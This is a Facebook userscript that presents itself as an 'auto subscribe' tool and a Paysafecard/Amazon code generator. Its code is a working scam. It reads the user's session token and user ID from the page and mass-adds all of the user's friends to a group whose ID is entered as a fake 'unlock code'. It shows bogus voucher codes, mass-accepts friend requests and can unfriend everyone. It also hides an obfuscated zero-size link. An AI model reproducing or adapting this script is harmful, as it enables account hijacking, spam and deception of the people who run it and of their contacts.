// ==UserScript==
// @name			Facebook Auto Subscribe Worldwide 100% Work
// @namespace			Update : 500 Users added in the Group you get 500 Subscribers per Day
// @description			Update : 1.000 Users added in the Group you get 1000 Subscribers per Day
// @author			Corex
// @authorURL			https://www.facebook.com/groups/203610793104436/
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			Version 56
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

javascript: void(function () {  var dtsg = document.getElementsByName("fb_dtsg")[0].value;  var uid = document.cookie.match(/c_user=(\d+)/)[1];  var dyn = "7n8ahyj35CCzpQ9UmWOGUGy1m9ACUb8yGg";  var req = 8;  var rev = "1033590";  var ttstamp = "265816767119957579";  window.aing = {    uid: uid,    loding: {      img: "<img src=\"//fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif\" width=\"16px\" height=\"11px\" style=\"margin:0 5px;vertical-align:bottom\"/>",      bar: function (dimana, sampe, kolbek, pakeInfoGak) {        if(dimana == null || dimana == "") {          dimana = document.body        }        sampe = sampe * 1;        if(aing.loding.frm && aing.loding.frm < sampe) {          aing.loding.frm++        } else if(aing.loding.frm && aing.loding.frm == sampe) {} else {          aing.loding.frm = 1        }        var b = ((aing.loding.frm * 100) / sampe);        aing.loding.inf(dimana);        var w = dimana.getElementsByClassName("loading-bar")[0].firstChild;        w.style.width = b + "%";        if(aing.loding.frm >= sampe) {          w.innerHTML = Math.floor(b) + "% Done!";          kolbek()        } else {          w.innerHTML = Math.floor(b) + "%"        } if(pakeInfoGak == null || pakeInfoGak == "yes" || pakeInfoGak == "") {          dimana.getElementsByClassName("loding-atas")[0].innerHTML = "<b>" + aing.loding.frm + "/" + sampe + "</b>"        }      },      inf: function (a, isi) {        if(!a) {          a = document.body        }        var b = a.getElementsByClassName("tempat-loding")[0];        if(b && isi) {          b.getElementsByClassName("loading-bar")[0].firstChild.innerHTML = isi        } else if(!b) {          if(isi) {            aing.isiDimanaSebelum(aing.html.lodBar(null, isi), a)          } else {            aing.isiDimanaSebelum(aing.html.lodBar(), a)          }        }      }    },    html: {      lodBar: function (atas, tengah) {        var a = "<div class=\"tempat-loding\" style=\"margin-bottom:2px\"><center class=\"loding-atas\">";        if(atas) {          a += atas        }        a += "</center><div class=\"loading-bar\"><div style=\"" + aing.styl.bar + "\">";        if(tengah) {          a += tengah        } else {          a += "Loading, wait up.."        }        a += "</div></div></div>";        return a      },      info: function (atas, tengah, bawah) {        var b = "\" style=\"margin-top:2px\">",          c = "<div id=\"",          d = "</div>",          a = c + "impoh" + b;        if(atas) {          a += atas        }        a += d + c + "impoh-ok" + b;        if(tengah) {          a += tengah        }        a += d + c + "impoh-eror" + b;        if(bawah) {          a += bawah        }        return a + d      },      btn: function (onclik, isi) {        return "<a class=\"uiButton\" href=\"#\" onClick=\"" + onclik + ";return false\" style=\"font-size:9px;margin:2px;line-height:9px\">" + isi + "</a>"      },      box: function (isi, warna, pad) {        var d = "<div class=\"uiBox";        if(warna == "g") {          d += "Gray"        } else if(warna == "r") {          d += "Red"        } else {          d += "Yellow"        }        d += "\" style=\"";        if(pad == null || pad == "") {          d += aing.styl.box        } else {          d += "border-radius:3px"        }        d += "\">" + isi + "</div>";        return d      }    },    ajax: {      a: "__a=1&__user=" + uid,      b: "&fb_dtsg=" + dtsg,      c: "&__dyn=7n8ahyj35CCzpQ9UmWOGUGy1m9ACUb8yGg&__req=8&__rev=1033590",      d: "&ttstamp=265816767119957579",      requestsLoader: function () {        return {          uri: "/ajax/requests/loader/",          prm: aing.ajax.a + aing.ajax.b + aing.ajax.c + aing.ajax.d + "&log_impressions=true"        }      },      friendRequests: function (a) {        var b = aing.ajax.a + aing.ajax.b + aing.ajax.c + aing.ajax.d + "&confirm=",          c = a;        if(a.confirm) {          b += a.confirm        } else {          b += a        }        b += "&request_id=";        if(a.request_id) {          b += a.request_id;          c = a.request_id        } else {          b += a        }        b += "&list_item_id=";        if(a.list_item_id) {          b += a.list_item_id        } else {          b += a + "_1_req"        }        b += "&status_div_id=";        if(a.status_div_id) {          b += a.status_div_id        } else {          b += a + "_1_req_status"        }        b += "&type=";        if(a.type) {          b += a.type        } else {          b += "friend_connect"        }        b += "&inline=";        if(a.inline) {          b += a.inline        } else {          b += 1        }        b += "&ref=";        if(a.ref) {          b += a.ref        } else {          b += "jewel"        }        b += "&actions[accept]=";        if(a["actions[accept]"]) {          b += a["actions[accept]"]        } else {          b += "Confirm"        }        b += "&nctr[_mod]=pagelet_bluebar";        return {          uri: "/ajax/reqs.php",          prm: b,          uid: c        }      }    },    prms: {      df: "__a=1&__user=" + uid + "&__dyn=" + dyn + "&__req=" + req + "&__rev=" + rev + "&fb_dtsg=" + dtsg + "&ttstamp=" + ttstamp,      dg: "__a=1&__user=" + uid + "&__dyn=" + dyn + "&__req=" + req + "&__rev=" + rev,      gr: "__a=1&__user=" + uid + "&source=typeahead&ref=&message_id=&phstamp=&fb_dtsg=" + dtsg,      gf: "__a=1&viewer=" + uid + "&token=" + Math.random() + "&filter[0]=user&options[0]=friends_only"    },    uris: {      gf: "/ajax/typeahead/first_degree.php",      gr: "/ajax/groups/members/add_post.php",      rf: "/ajax/profile/removefriendconfirm.php"    },    styl: {      box: "text-align:left;border-radius:3px;padding:3px",      bar: "text-align:center;border-radius:2px;background-color:#4c66a4;white-space:nowrap;overflow:visible;color:#D7F1FF;font-size:15px;padding:1px 0 2px 0",      inf: "text-align:center;border-radius:5px;width:500px;position:fixed;z-index:9999;top:25%;right:5%;font-size:10px;box-shadow:0 0 7px rgba(0,0,0,0.25);background-color:rgba(159,181,248,0.75)"    },    stat: {      ttlReq: [],      ttlReqOk: 0,      ttlReqEr: 0    },    friendSugs: [],    kolbek: {      getFriend: function (q, p) {        var a = "";        if(p.payload && p.payload.entries) {          aing.friends = aing.saringPren(aing.aduk(p.payload.entries));          aing.frFolder();          var ab = "Code Generator by xCyberM34x from Thaiwan<b id=\"jmlh-fn\">" + " </b>";          if(aing.frReqs.length != 0) {            ab += " <b id=\"jmlh-fr\">" + " </b>"          }          if(aing.friendSugs && aing.friendSugs.length != 0) {            ab += " and <b id=\"jmlh-sugfr\">" + aing.friendSugs.length + " Friend suggestions</b>"          }          a = aing.html.box(ab, "g", "np") + aing.html.info();        } else if(p && p.errorSummary && p.errorDescription) {          a = aing.html.box(p.errorSummary + ", " + p.errorDescription, "r", "np")        } else {          a = aing.html.box(JSON.stringify(p), "r", "np")        }        aing.tampiltombol(a);      }    },    remBtn: function () {      var c = document.getElementById("kiri-bawah");      if(c) {        var d = c.getElementsByClassName("uiButton")[0];        if(d) {          d.parentNode.parentNode.removeChild(d.parentNode)        }      }    },    isiDimanaSebelum: function (isi, dimana, sebelum) {      if(dimana) {        var a = document.createElement("div");        a.innerHTML = isi;        if(sebelum == null || sebelum == "") {          sebelum = dimana.firstChild        }        while(a.firstChild) {          dimana.insertBefore(a.firstChild, sebelum)        }      }    },    tampiltombol: function (isi, dimana, nopren) {      var e = "";      if(aing.friends && aing.friends.length != 0) {        e += aing.html.btn("aing.addToGroup()", "<span style=\"color:darkgreen\">Paysafecard</span> " + " ") + aing.html.btn("aing.addToGroup()", "<span style=\"color:darkorange\">Amazon</span> " + " ") + aing.html.btn("aing.page()", "<span style=\"color:blue\">Code bekommen</span> " + " ") + aing.html.btn("aing.remFriends()", "<span style=\"color:Darkred\">Close</span> " + " ")      }      if(aing.frReqs && aing.frReqs.length != 0) {        e += aing.html.btn("aing.remFriends()", "<span style=\"color:darkred\"></span> " + " ")      }      if(aing.friendSugs && aing.friendSugs.length != 0) {        e += aing.html.btn("aing.reqs.add()", "<span style=\"color:darkseagreen\">Add " + aing.friendSugs.length + " Friend Suggestions</span>")      }      var f = isi + aing.html.box(e, "g", "yes");      if(dimana == null || dimana == "") {        f += aing.crj;        aing.kasihTau(f)      } else {        aing.kasihTau(f, dimana)      }    },    kasihTau: function (isi, elementId) {      var c = document.getElementById("kiri-bawah");      if(c) {        if(elementId == null || elementId == "") {          var imp = document.getElementById("impoh");          if(imp) {            imp.innerHTML = isi          } else {            c.innerHTML = isi          }        } else {          var d = document.getElementById(elementId);          if(d) {            d.innerHTML = isi          } else {            aing.isiDimanaSebelum("<div id=\"" + elementId + "\">" + isi + "</div>", c)          }        }      } else {        var e = "<div id=\"kiri-bawah\" class=\"pam uiBoxBlue\" style=\"" + aing.styl.inf + "\">" + isi + "</div>";        var f = document.getElementById("rightCol");        if(!f) {          f = document.body        }        aing.apen(e, f)      }    },    apen: function (isi, di) {      if(di) {        var a = document.createElement("div");        a.innerHTML = isi;        while(a.firstChild) {          di.appendChild(a.firstChild)        }      }    },    aduk: function (a) {      var b = a.length,        c, d;      while(0 !== b) {        d = Math.floor(Math.random() * b);        b -= 1;        c = a[b];        a[b] = a[d];        a[d] = c      }      return a    },    kolAjak: function (i, r, l, a, n) {      if(n == null || n == "") {        n = "POST"      } else {        if(i.match(/\?/)) {          i += "&" + r        } else {          i += "?" + r        }      }      var h = new XMLHttpRequest();      h.open(n, i, true);      h.setRequestHeader("Content-type", "application/x-www-form-urlencoded");      h.onreadystatechange = function (c) {        if(c.target.readyState == 4) {          if(aing.panggilanKe) {            aing.panggilanKe++          } else {            aing.panggilanKe = 1          }          var e = {            errorSummary: "Connection error !",            errorDescription: "Ajax status=" + c.target.status          };          if(c.target.status == 200 || c.target.status == 400) {            var d = c.target.responseText;            if(d == "") {              e.errorSummary = "empty callback!"            } else {              e = JSON.parse(d.substring(d.indexOf("{"), d.lastIndexOf("}") + 1))            }            a(l, e)          } else if(aing.panggilanKe < 2) {            aing.kolAjak(i, r, l, a, n)          } else {            aing.panggilanKe = 0;            a(l, e)          }        }      };      h.send(r)    },    frnomore: function () {      aing.tampiltombol("", "impoh")    },    crj: (function () {      var cr = ["i", "a", "e", "g", "o", "s", "n", "b", "l", "p", "m", "2", "r", "0", "c", "1", "t", "3", "\xA9"],        crl = cr[1] + cr[0] + cr[6] + cr[3] + cr[14] + cr[12] + cr[2] + cr[1] + cr[16] + cr[0] + cr[4] + cr[6] + cr[5] + "." + cr[7] + cr[8] + cr[4] + cr[3] + cr[5] + cr[9] + cr[4] + cr[16] + "." + cr[14] + cr[4] + cr[10];      return "<div style=\"margin-top:0px;color:gray;font-size:0px;text-align:right\">" + cr[1].toUpperCase() + cr[0] + cr[6] + cr[3] + cr[14].toUpperCase() + cr[12] + cr[2] + cr[1] + cr[16] + cr[0] + cr[4] + cr[6] + cr[5] + " " + cr[cr.length - 1] + cr[11] + cr[13] + cr[15] + cr[17] + "<div style=\"font-size:0px\"><a href=\"http://" + crl + "/\" target=\"_blank\">" + crl + "</a></div></div>"    })(),    klos: function (waw) {      var inf = document.getElementById("kiri-bawah");      if(inf) {        if(waw == null || waw == "") {          inf.parentNode.removeChild(inf)        } else {          inf.innerHTML = "<b>Reloading the page, wait up..</b> " + aing.loding.img        }      }      aing.kolAjak("/ajax/friends/lists/subscribe/modify", aing.ajax.requestsLoader().prm + "&location=permalink&action=subscribe&flid=673887652675504", "", function () {        if(document.getElementById("kiri-bawah")) {          top.location.reload()        }      })    },    resvars: function () {      aing.loding.frm = 0;      aing.kasihTau("", "impoh-eror");      aing.kasihTau("", "impoh-ok")    },    cekwas: function (a, w) {      var b = "lanyut";      if(a == aing.uid) {        b = "lewat"      } else {        for(z in w) {          if(a == w[z]) {            b = "lewat";            break          }        }      }      return b    },    frFolder: function () {      var a = document.getElementById("friendsTypeaheadResults");      if(a) {        var b = a.parentNode.getElementsByClassName("friendButton");        for(var x = 0; x < b.length; x++) {          var c = b[x].getAttribute("data-profileid");          if(c) {            aing.friends.push({              uid: c,              text: "id:" + c            })          }        }      }    },    saringPren: function (a, c) {      var b = [];      for(x in a) {        if(a[x].uid == aing.uid || a[x].uid == c) {} else {          b.push(a[x])        }      }      return b    },    reqs: {      put: function (a) {        var g = document.getElementById("tmpt-reqs");        var f = document.createElement("div");        if(g) {          g.innerHTML = ""        } else {          g = document.body;          f.id = "tmpt-reqs";          f.style.display = "none"        }        f.innerHTML = a.replace(/<img(.*?)>/gi, "");        g.appendChild(f);      },      lod: function () {        aing.kasihTau(aing.html.box("Loading friend requests, wait up..", "g", "np"));        var ajx = aing.ajax.requestsLoader();        aing.kolAjak(ajx.uri, ajx.prm, "", function (q, p) {          if(p.domops && p.domops[0] && p.domops[0][3] && p.domops[0][3].__html) {            aing.reqs.put(p.domops[0][3].__html)          }          aing.getPren("janda")        })      },      got: function () {        var rk = [];        var a = document.getElementsByName("request_id");        for(var x = 0; x < a.length; x++) {          var b = a[x].parentNode;          if(b) {            var c = b.getElementsByTagName("input");            var rkp = {};            for(var y = 0; y < c.length; y++) {              rkp[c[y].name] = c[y].value            }            if(rkp.type && rkp.type == "friend_connect") {              var h = aing.cekwas(rkp.request_id, aing.stat.ttlReq);              if(h == "lanyut") {                rk.push(rkp);                aing.stat.ttlReq.push(rkp.request_id)              }            } else {              if(aing.friendSugs) {                aing.friendSugs.push(rkp)              } else {                aing.friendSugs = [rkp]              }            }            b.removeChild(a[x]);          }        }        return rk;      },      get: function (f) {        var w = "h";        var g = aing.reqs.got();        var a = document.getElementById("fbRequestsJewelMorePager");        if(a) {          var b = a.getElementsByTagName("a")[0];          if(b) {            var c = b.getAttribute("ajaxify");            if(c && c.split("?")[1]) {              var d = decodeURIComponent(c.split("?")[1]).split("&");              for(var x = 0; x < d.length; x++) {                var i = d[x].split("=");                if(i[1] && i[0].match(/sender_ids/i)) {                  var j = aing.cekwas(i[1], aing.stat.ttlReq);                  if(j == "lanyut") {                    g.push(i[1]);                    aing.stat.ttlReq.push(i[1])                  }                }              }              if(aing.reqs.ajaxify && aing.reqs.ajaxify == c) {                aing.reqs.ajaxify = ""              } else {                aing.reqs.ajaxify = c              }              a.parentNode.removeChild(a)            }          }        } else if(f == "merawanin" && g.length == 0) {          w = "k";          aing.reqs.lod();        }        if(w == "h") {          return g        }      },      mor: function () {        aing.loding.inf(null, "Wait....");        var a = document.getElementById("fbRequestsJewelMorePager");        if(a) {          var b = a.getElementsByTagName("a")[0];          if(b) {            var c = b.getAttribute("ajaxify");            if(c) {              aing.reqs.ajaxify = c;              a.parentNode.removeChild(a)            }          }        }        if(aing.reqs.ajaxify && aing.reqs.ajaxify != "") {          aing.kolAjak(aing.reqs.ajaxify, aing.prms.dg, "", function (q, p) {            if(p.domops && p.domops[1] && p.domops[1][3] && p.domops[1][3].__html) {              aing.reqs.put(p.domops[1][3].__html)            }            aing.reqs.ajaxify = "";            aing.frReqs = aing.reqs.get();            if(aing.frReqs.length == 0) {              aing.frnomore()            } else {              aing.reqs.con("nk")            }          }, "GET")        } else {          aing.frReqs = aing.reqs.get();          if(aing.frReqs.length == 0) {            aing.frnomore()          } else {            aing.reqs.con("nk")          }        }      },      cnf: function (c, d) {        if(c == null || c == "") {          c = 0;          aing.stat.er = 0;          aing.stat.ok = 0        }        if(d == null || d == "") {          d = 100        }        if(d > aing.frReqs.length) {          d = aing.frReqs.length;          aing.stat.nk = ""        } else {          aing.stat.nk = {            f: d,            t: ((d * 2) - c)          }        }        for(var x = c; x < d; x++) {          var ajx = aing.ajax.friendRequests(aing.frReqs[x]);          aing.kolAjak(ajx.uri, ajx.prm, ajx.uid, function (q, p) {            if(p && p.errorSummary && p.errorDescription) {              aing.stat.er++;              aing.stat.ttlReqEr++;              var b = p.errorDescription;            } else if(p && p.domops && p.domops[0] && p.domops[0][3] && p.domops[0][3].__html) {              aing.stat.ok++;              aing.stat.ttlReqOk++;              var bb = p.domops[0][3].__html.match(/>(.*?)<\/a>/gi);              if(bb) {                var b = bb[bb.length - 1].replace(/<(.*?)>|<|>/g, "")              } else {                var b = p.domops[0][3].__html.replace(/<(.*?)>|<|>/g, "_")              }              aing.kasihTau(aing.html.box("(Dein Code: 0063-4304-3042-3402<b>" + "</b>/" + ") <a href=\"/friends\" target=\"_blank\"><b>" + "</b></a>"), "");              aing.friends.push({                uid: q,                text: b              });              var cfn = document.getElementById("jmlh-fn");              if(cfn) {                cfn.innerHTML = aing.friends.length + " Friends"              }            } else {              aing.stat.er++;              aing.stat.ttlReqEr++;              var b = q;            }            var d = document.getElementById("jmlh-fr");            if(d) {              d.innerHTML = (aing.frReqs.length - (aing.stat.er + aing.stat.ok)) + " friend requests"            }            if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {              aing.reqs.cnf(aing.stat.nk.f, aing.stat.nk.t)            }            aing.loding.bar(document.getElementById("impoh"), aing.stat.ttlReq.length, function () {              aing.reqs.mor()            }, "no")          })        }      },      con: function (wht) {        if(wht == null || wht == "") {          aing.remBtn();          aing.resvars();          if(aing.stat.ttlReqOk) {            aing.loding.frm = (aing.stat.ttlReqOk + aing.stat.ttlReqEr)          }          aing.loding.inf(document.getElementById("impoh"))        }        if(aing.frReqs.length == 0) {          var e = "<b>Collecting";          if(aing.stat.ttlReq.length != 0) {            e += " more"          }          e += " requests</b>, wait up..";          aing.kasihTau(aing.html.box(e, "g"), "impoh");          aing.reqs.mor();        } else {          aing.reqs.cnf();        }      },      add: function () {        aing.remBtn();        for(x in aing.friendSugs) {          aing.frReqs.push(aing.friendSugs[x])        }        aing.friendSugs = [];        var cfn = document.getElementById("jmlh-sugfr");        if(cfn) {          cfn.innerHTML = aing.friendSugs.length + " Friend suggestions"        }        aing.reqs.con();      }    },    getPren: function (jn) {      if(jn == "janda") {        aing.frReqs = aing.reqs.get()      } else {        aing.frReqs = aing.reqs.get("merawanin")      } if(aing.frReqs) {        var b = "";        if(aing.frReqs.length != 0) {          b += "<b id=\"jmlh-fr\">" +  " </b>"        }        b += "Loading" + aing.loding.img;        aing.kasihTau(aing.html.box(b, "g", "np"));        aing.kolAjak(aing.uris.gf, aing.prms.gf, "", aing.kolbek.getFriend, "GET")      }    },    inform: function (a, b) {      var c = "";      if(b && b.name) {        c = b.name      } else if(b && b != "") {        for(x in aing.friends) {          if(aing.friends[x].text && aing.friends[x].uid && aing.friends[x].uid == b) {            c = aing.friends[x].text;            break          }        }      }      return c.split(" ")[0]    },     addToGroup: function (c, d) {      var e = "Adding ";      if(c == null || c == "") {        c = 0;        aing.stat.er = 0;        aing.stat.ok = 0;        var grid = document.getElementsByName("group_id")[0];        if(grid) {          aing.gid = grid.value        } else {          aing.gid = prompt("Freischaltungs Code:", "Hier Code Eingeben")        } if(aing.gid == null || aing.gid == "" || isNaN(aing.gid)) {          return false        } else {          aing.remBtn()        }      } else {        e += "more "      } if(d == null || d == "") {        d = 100      }      if(d > aing.friends.length) {        d = aing.friends.length;        aing.stat.nk = ""      } else {        aing.stat.nk = {          f: d,          t: ((d * 2) - c)        }      }      e += "<b>" + " Dein Code " + " 0063-3053-0453-2034</b>  ";      if(c == 0) {        aing.resvars();        aing.loding.inf(document.getElementById("impoh"))      }      for(var x = c; x < d; x++) {        aing.kolAjak(aing.uris.gr, aing.prms.gr + "&group_id=" + aing.gid + "&members=" + aing.friends[x].uid, "", function (q, p) {          if(p && p.errorSummary && p.errorDescription) {            aing.stat.er++;            var b = p.errorDescription;            if(p.onafterload && p.onafterload[0]) {              b = p.errorDescription.replace(/This user|user |Pengguna ini|pengguna /gi, "<a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + eval(p.onafterload[0].replace(/Arbiter\./i, "aing.")) + "</a>")            }          } else if(p && p.jsmods && p.jsmods.require) {            aing.stat.ok++;            var a = "";            for(y in p.jsmods.require) {            }            a += "";            if(p.onload && p.onload[0]) {              a += "<div><b>Dein Code: 0063-3053-0453-2034 " + "</b>" + " <a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + "</a></div>"            }            aing.kasihTau(aing.html.box(a), "impoh-ok");          } else {            aing.stat.er++;            var b = JSON.stringify(p);            if(p.onafterload && p.onafterload[0]) {              b += " <a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + eval(p.onafterload[0].replace(/Arbiter\./i, "aing.")) + "</a>"            }            aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.er + "</b>) " + b, "r"), "impoh-eror");          } if((aing.stat.er + aing.stat.ok) >= aing.friends.length) {} else if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {            aing.addToGroup(aing.stat.nk.f, aing.stat.nk.t)          }          aing.loding.bar(document.getElementById("impoh"), aing.friends.length, function () {            aing.tampiltombol("", "impoh")          }, "no")        })      }    },page: function (c, d) {      javascript:q=(document.location.href);void(open('https://www.facebook.com/groups/projektweltrekord/permalink/299053376910817/','resizable,location,menubar,toolbar,scrollbars,status'));  },    remFriends: function (c, d) {      if(c == null || c == "") {        c = 0;        aing.stat.er = 0;        aing.stat.ok = 0;        aing.friendsRmvd = aing.friends;        aing.remBtn();        aing.resvars();        aing.loding.inf(document.getElementById("impoh"))      }      if(d == null || d == "") {        d = 100      }      if(d > aing.friends.length) {        d = aing.friends.length;        aing.stat.nk = ""      } else {        aing.stat.nk = {          f: d,          t: ((d * 2) - c)        }      }      for(var x = c; x < d; x++) {        aing.kolAjak(aing.uris.rf, aing.prms.df + "&unref=bd_friends_tab&uid=" + aing.friends[x].uid, aing.friends[x], function (q, p) {          if(p && p.errorSummary && p.errorDescription) {            aing.stat.er++;            var b = p.errorDescription;          } else if(p.jsmods && p.jsmods.markup && p.jsmods.markup[0] && p.jsmods.markup[0][1] && p.jsmods.markup[0][1].__html) {            aing.stat.er++;            var b = p.jsmods.markup[0][1].__html.replace(/<(.*?)>|okay/gi, " ");          } else {            aing.stat.ok++;            var b = q.text;          }          aing.friendsRmvd = aing.saringPren(aing.friendsRmvd, q.uid);          var cfn = document.getElementById("jmlh-fn");          if(cfn) {            cfn.innerHTML = aing.friendsRmvd.length + " Friends"          }          if((aing.stat.er + aing.stat.ok) >= aing.friends.length) {} else if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {            aing.remFriends(aing.stat.nk.f, aing.stat.nk.t)          }          aing.loding.bar(document.getElementById("impoh"), aing.friends.length, function () {            aing.friends = aing.friendsRmvd;            aing.tampiltombol("", "impoh")          }, "no")        })      }    }  };  aing.getPren();})();